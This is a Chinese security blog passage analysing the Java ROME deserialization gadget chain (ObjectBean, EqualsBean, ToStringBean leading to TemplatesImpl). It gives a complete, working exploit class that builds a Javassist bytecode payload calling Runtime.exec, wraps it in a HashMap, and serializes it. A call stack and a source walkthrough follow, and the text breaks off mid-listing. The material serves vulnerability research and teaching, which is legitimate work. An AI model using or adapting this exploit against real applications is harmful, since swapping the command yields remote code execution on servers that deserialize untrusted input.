<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="a441570625ea228c2e9595197ba649a8">Java安全之Rome链分析与利用</h1>
<h2 data-content="1" id="639ab8f60d2df0cd6abf884f262ac261">1. Rome简介</h2>
<p>官方文档：<a href="https://rometools.github.io/rome/" target="_blank">https://rometools.github.io/rome/</a></p>
<blockquote>
<p>ROME is a Java framework for RSS and Atom feeds. It's open source and licensed under the Apache 2.0 license.<br/>
ROME includes a set of parsers and generators for the various flavors of syndication feeds, as well as converters to convert from one format to another. The parsers can give you back Java objects that are either specific for the format you want to work with, or a generic normalized SyndFeed class that lets you work on with the data without bothering about the incoming or outgoing feed type.</p>
</blockquote>
<p>ROME 是一个用于 RSS 和 Atom 订阅的 Java 框架。它是开源的，并根据 Apache 2.0 许可授权。</p>
<p>ROME 包括一套解析器和生成器，可用于各种形式的聚合提要，以及将一种格式转换为另一种格式的转换器。解析器可以为您提供特定格式的 Java 对象，或者是通用的规范化 SyndFeed 类，让您可以处理数据，而无需考虑传入或传出的 feed 类型。</p>
<h2 data-content="1" id="19020a0dc1e8690ac849fa699e4b37c0">2. 相关类</h2>
<p>ObjectBean、EqualsBean、ToStringBean都是可利用类</p>
<p>在ToStringBean的toString方法中，大致意思就是传递一个类，获取该类的set或者get方法，并且能够使用invoke调用，这里就可以利用下面描述的链</p>
<p>另外在EqualsBean的beanHashCode方法中，也同样拥有相关功能</p>
<h2 data-content="1" id="0d6c6d7d4ed5ab4d480fa9167c46863f">3. 环境依赖</h2>
<div class="highlight"><pre><span></span><span class="nt">&lt;dependency&gt;</span>
    <span class="nt">&lt;groupId&gt;</span>rome<span class="nt">&lt;/groupId&gt;</span>
    <span class="nt">&lt;artifactId&gt;</span>rome<span class="nt">&lt;/artifactId&gt;</span>
    <span class="nt">&lt;version&gt;</span>1.0<span class="nt">&lt;/version&gt;</span>
<span class="nt">&lt;/dependency&gt;</span>
</pre></div>
<h2 data-content="1" id="04331ec435f1ee5d25260d629f5981a8">4. ObjectBean利用链</h2>
<h3 data-content="1" id="b63780521fc508a3a4ee18e46c358bdf">利用链</h3>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">getOutputProperties</span><span class="o">()</span>
<span class="n">ToStringBean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">String</span><span class="o">)</span>
<span class="n">ToStringBean</span><span class="o">.</span><span class="na">toString</span><span class="o">()</span>
<span class="n">EqualsBean</span><span class="o">.</span><span class="na">beanHashCode</span><span class="o">()</span>
<span class="n">EqualsBean</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span>
<span class="n">ObjetBean</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span>
<span class="n">HashMap</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;.</span><span class="na">hash</span><span class="o">(</span><span class="n">Object</span><span class="o">)</span>
<span class="n">HashMap</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;.</span><span class="na">readObject</span><span class="o">(</span><span class="n">ObjectInputStream</span><span class="o">)</span>
</pre></div>
<h3 data-content="1" id="d75e6db789aa346c0760dc6a46d66598">EXP</h3>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">RomeSec</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.ObjectBean</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.ToStringBean</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ObjectBeanExp</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">AbstractTranslet</span><span class="o">=</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="o">;</span>
        <span class="n">String</span> <span class="n">TemplatesImpl</span><span class="o">=</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="o">;</span>

        <span class="c1">// 创建恶意类</span>
        <span class="n">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
        <span class="n">classPool</span><span class="o">.</span><span class="na">appendClassPath</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">);</span>
        <span class="n">CtClass</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">"dddd"</span><span class="o">);</span>
        <span class="n">payload</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">classPool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">));</span>
        <span class="n">payload</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">setBody</span><span class="o">(</span><span class="s">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>

        <span class="c1">// 创建TemplatesImpl对象</span>
        <span class="n">Object</span> <span class="n">templateImpl</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">TemplatesImpl</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{}).</span><span class="na">newInstance</span><span class="o">();</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">bytes</span><span class="o">});</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"test"</span><span class="o">);</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

        <span class="c1">// 创建ToStringBean对象</span>
        <span class="n">ToStringBean</span> <span class="n">toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">templateImpl</span><span class="o">);</span>
        <span class="c1">// 创建ObjectBean对象</span>
        <span class="n">ObjectBean</span> <span class="n">objectBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectBean</span><span class="o">(</span><span class="n">ToStringBean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">toStringBean</span><span class="o">);</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span><span class="s">"_toStringBean"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span> <span class="s">"_cloneableBean"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

        <span class="c1">// 创建hashMap</span>
        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span> <span class="s">"aaaa"</span><span class="o">);</span>

        <span class="c1">// 序列化</span>
        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ObjectBean.bin"</span><span class="o">));</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashMap</span><span class="o">);</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>

        <span class="c1">// 反序列化</span>
        <span class="n">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"ObjectBean.bin"</span><span class="o">));</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFiled</span><span class="o">(</span><span class="n">Object</span> <span class="n">o</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldname</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">o</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldname</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">o</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="9f5c0bf324da169b1ed355ae4599653d">函数调用栈</h3>
<div class="highlight"><pre><span></span><span class="nl">exec:</span><span class="mi">347</span><span class="o">,</span> <span class="n">Runtime</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">)</span>
<span class="o">&lt;</span><span class="n">clinit</span><span class="o">&gt;:-</span><span class="mi">1</span><span class="o">,</span> <span class="n">dddd</span>
<span class="nl">newInstance0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeConstructorAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeConstructorAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">45</span><span class="o">,</span> <span class="n">DelegatingConstructorAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">422</span><span class="o">,</span> <span class="n">Constructor</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">442</span><span class="o">,</span> <span class="n">Class</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">)</span>
<span class="nl">getTransletInstance:</span><span class="mi">455</span><span class="o">,</span> <span class="n">TemplatesImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">)</span>
<span class="nl">newTransformer:</span><span class="mi">486</span><span class="o">,</span> <span class="n">TemplatesImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">)</span>
<span class="nl">getOutputProperties:</span><span class="mi">507</span><span class="o">,</span> <span class="n">TemplatesImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">toString:</span><span class="mi">137</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">toString:</span><span class="mi">116</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">beanHashCode:</span><span class="mi">193</span><span class="o">,</span> <span class="n">EqualsBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">hashCode:</span><span class="mi">110</span><span class="o">,</span> <span class="n">ObjectBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">hash:</span><span class="mi">338</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">1397</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invokeReadObject:</span><span class="mi">1058</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readSerialData:</span><span class="mi">1900</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readOrdinaryObject:</span><span class="mi">1801</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject0:</span><span class="mi">1351</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">371</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">main:</span><span class="mi">50</span><span class="o">,</span> <span class="n">ObjectBeanExp</span> <span class="o">(</span><span class="n">RomeSec</span><span class="o">)</span>
</pre></div>
<h3 data-content="1" id="a116e937f1bac1af13d33598879ad642">详细分析</h3>
<p>注：调试分析的时候只需要保留反序列化部分的代码即可<br/>
从HashMap的readObject方法开始<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124333-77328896-b74e-1.png"/></p>
<p>这里的key是ObjectBean对象，这就是exp中向HashMap对象put objectBean对象的原因，这样key就是objectBean对象</p>
<div class="highlight"><pre><span></span><span class="c1">// 创建hashMap</span>
<span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
<span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span> <span class="s">"aaaa"</span><span class="o">);</span>
</pre></div>
<p>为什么key需要是objectBean对象，进入hash函数<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124504-adb2ce94-b74e-1.png"/></p>
<p>key为objectBean对象，调用其hashCode方法<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124525-ba66841e-b74e-1.png"/></p>
<p><strong>问题一</strong>：这里的_equalsBeans是EqualsBean对象，如何得来？<br/>
进入EqualsBean的beanHashCode方法<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124544-c567dda4-b74e-1.png"/></p>
<p><strong>问题二</strong>：这里的EqualsBean对象的_obj是ToStringBean对象，如何得来？</p>
<p>进入ToStringBean的toString方法</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span>
    <span class="n">Stack</span> <span class="n">stack</span> <span class="o">=</span> <span class="o">(</span><span class="n">Stack</span><span class="o">)</span><span class="n">PREFIX_TL</span><span class="o">.</span><span class="na">get</span><span class="o">();</span>
    <span class="n">String</span><span class="o">[]</span> <span class="n">tsInfo</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">[])(</span><span class="n">stack</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">()</span> <span class="o">?</span> <span class="kc">null</span> <span class="o">:</span> <span class="n">stack</span><span class="o">.</span><span class="na">peek</span><span class="o">());</span>
    <span class="n">String</span> <span class="n">prefix</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">tsInfo</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">_obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">();</span>
        <span class="n">prefix</span> <span class="o">=</span> <span class="n">className</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">lastIndexOf</span><span class="o">(</span><span class="s">"."</span><span class="o">)</span> <span class="o">+</span> <span class="mi">1</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="n">prefix</span> <span class="o">=</span> <span class="n">tsInfo</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
        <span class="n">tsInfo</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="n">prefix</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="c1">// // 调用重载的 toString 方法，并传入前缀参数</span>
    <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">prefix</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124606-d2b40050-b74e-1.png"/></p>
<p>进入有参数的重载方法</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">(</span><span class="n">String</span> <span class="n">prefix</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">StringBuffer</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">(</span><span class="mi">128</span><span class="o">);</span>

    <span class="k">try</span> <span class="o">{</span>
        <span class="c1">// 获取对象的属性描述符数组</span>
        <span class="n">PropertyDescriptor</span><span class="o">[]</span> <span class="n">pds</span> <span class="o">=</span> <span class="n">BeanIntrospector</span><span class="o">.</span><span class="na">getPropertyDescriptors</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">_beanClass</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">pds</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="c1">// 遍历属性描述符数组</span>
            <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pds</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
                <span class="c1">// 获取属性名</span>
                <span class="n">String</span> <span class="n">pName</span> <span class="o">=</span> <span class="n">pds</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">();</span>
                <span class="c1">// 获取属性的读取方法</span>
                <span class="n">Method</span> <span class="n">pReadMethod</span> <span class="o">=</span> <span class="n">pds</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getReadMethod</span><span class="o">();</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">pReadMethod</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">pReadMethod</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">()</span> <span class="o">!=</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span> <span class="n">pReadMethod</span><span class="o">.</span><span class="na">getParameterTypes</span><span class="o">().</span><span class="na">length</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                    <span class="c1">// 调用属性的读取方法获取属性值</span>
                    <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">pReadMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">_obj</span><span class="o">,</span> <span class="n">NO_PARAMS</span><span class="o">);</span>
                    <span class="k">this</span><span class="o">.</span><span class="na">printProperty</span><span class="o">(</span><span class="n">sb</span><span class="o">,</span> <span class="n">prefix</span> <span class="o">+</span> <span class="s">"."</span> <span class="o">+</span> <span class="n">pName</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var8</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"\n\nEXCEPTION: Could not complete "</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">_obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">".toString(): "</span> <span class="o">+</span> <span class="n">var8</span><span class="o">.</span><span class="na">getMessage</span><span class="o">()</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="k">return</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
<span class="o">}</span>
</pre></div>
<p>先观察getPropertyDescriptors方法，这里的this._beanClass为 Class Templates</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kd">synchronized</span> <span class="n">PropertyDescriptor</span><span class="o">[]</span> <span class="nf">getPropertyDescriptors</span><span class="o">(</span><span class="n">Class</span> <span class="n">klass</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IntrospectionException</span> <span class="o">{</span>
    <span class="n">PropertyDescriptor</span><span class="o">[]</span> <span class="n">descriptors</span> <span class="o">=</span> <span class="o">(</span><span class="n">PropertyDescriptor</span><span class="o">[])((</span><span class="n">PropertyDescriptor</span><span class="o">[])</span><span class="n">_introspected</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">klass</span><span class="o">));</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">descriptors</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// 这里</span>
        <span class="n">descriptors</span> <span class="o">=</span> <span class="n">getPDs</span><span class="o">(</span><span class="n">klass</span><span class="o">);</span>
        <span class="n">_introspected</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">klass</span><span class="o">,</span> <span class="n">descriptors</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="k">return</span> <span class="n">descriptors</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>进入getPDs方法</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="n">PropertyDescriptor</span><span class="o">[]</span> <span class="nf">getPDs</span><span class="o">(</span><span class="n">Class</span> <span class="n">klass</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IntrospectionException</span> <span class="o">{</span>
    <span class="c1">// 获取类的所有方法</span>
    <span class="n">Method</span><span class="o">[]</span> <span class="n">methods</span> <span class="o">=</span> <span class="n">klass</span><span class="o">.</span><span class="na">getMethods</span><span class="o">();</span>
    <span class="c1">// 获取所有的读取方法</span>
    <span class="n">Map</span> <span class="n">getters</span> <span class="o">=</span> <span class="n">getPDs</span><span class="o">(</span><span class="n">methods</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
    <span class="c1">// 获取所有的写入方法</span>
    <span class="n">Map</span> <span class="n">setters</span> <span class="o">=</span> <span class="n">getPDs</span><span class="o">(</span><span class="n">methods</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
    <span class="c1">// 合并读取方法和写入方法的结果</span>
    <span class="n">List</span> <span class="n">pds</span> <span class="o">=</span> <span class="n">merge</span><span class="o">(</span><span class="n">getters</span><span class="o">,</span> <span class="n">setters</span><span class="o">);</span>
    <span class="n">PropertyDescriptor</span><span class="o">[]</span> <span class="n">array</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PropertyDescriptor</span><span class="o">[</span><span class="n">pds</span><span class="o">.</span><span class="na">size</span><span class="o">()];</span>
    <span class="n">pds</span><span class="o">.</span><span class="na">toArray</span><span class="o">(</span><span class="n">array</span><span class="o">);</span>
    <span class="k">return</span> <span class="n">array</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>进入重载的getPDs方法</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="n">Map</span> <span class="nf">getPDs</span><span class="o">(</span><span class="n">Method</span><span class="o">[]</span> <span class="n">methods</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">setters</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IntrospectionException</span> <span class="o">{</span>
    <span class="n">Map</span> <span class="n">pds</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
    <span class="c1">// 遍历方法数组</span>
    <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">methods</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">pName</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="n">PropertyDescriptor</span> <span class="n">pDescriptor</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="c1">// 检查方法是否为公共方法</span>
